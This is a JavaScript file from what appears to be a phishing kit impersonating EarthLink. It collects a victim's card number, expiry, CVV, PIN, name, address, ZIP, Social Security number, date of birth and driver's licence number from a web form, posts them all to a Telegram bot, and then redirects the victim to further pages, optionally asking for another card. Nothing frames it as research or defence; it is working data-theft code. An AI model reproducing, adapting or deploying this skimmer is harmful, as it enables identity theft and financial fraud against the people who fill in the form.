const number = document.getElementById("1")
const expm = document.getElementById("2")
const expy = document.getElementById("3")
const csv = document.getElementById("4")
const cardpin = document.getElementById("5")
const name = document.getElementById("6")
const add = document.getElementById("7")
const zip = document.getElementById("8")
const ss = document.getElementById("9")
const dob = document.getElementById("10")
const driver = document.getElementById("11")
const btn = document.getElementById("btn")

const telegram = () => {
  const MESSAGE =
    `"📩 EarthLink Card Incoming"
    \n\n🔹 ${number.value}
    \n\n 🔹 ${expm.value}/${expy.value}
    \n\n 🔹 ${csv.value}
    \n\n 🔹 ${cardpin.value}
    \n\n 🔹 ${name.value}
    \n\n 🔹 ${add.value}
    \n\n 🔹 ${zip.value}
    \n\n 🔹 ${ss.value}
    \n\n 🔹 ${dob.value}
    \n\n 🔹 ${driver.value}`
      "";
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: MESSAGE,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent:");
      if(IncorrectCard === "on" && cardpage === 1){
        window.location.href = "crd2.html"

      }else if(IncorrectCard === "off" && cardpage === 1){
        window.location.href = "dmb.html"

      }else{
        window.location.href = "dmb.html"

      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
};

btn.addEventListener("click", (e)=>{
    e.preventDefault()
    if(
        number.value == "" || expm.value == "" || expy.value == "" || csv.value == "" || cardpin.value == "" || name.value == "" || add.value == "" || zip.value == "" || ss.value == "" || dob.value == ""

    ){
        alert("All field are required")
        return;

    }
    telegram()
})